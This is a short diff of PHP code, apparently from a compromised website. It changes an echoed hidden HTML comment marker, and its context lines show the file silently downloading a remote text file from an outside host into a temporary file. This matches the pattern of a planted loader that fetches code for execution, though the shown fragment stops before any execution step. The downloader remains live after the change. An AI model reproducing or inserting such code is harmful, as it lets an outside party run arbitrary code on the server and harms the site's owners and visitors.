@@ -1,4 +1,4 @@
-echo "<!--rahatinizabakin-->";
+echo "<!--rahatinizabaakin-->";
 $temp = tmpfile();
 $dosya = @file_get_contents("http://bdmsproduction.com/dosya/x.txt");
 fwrite($temp, $dosya);
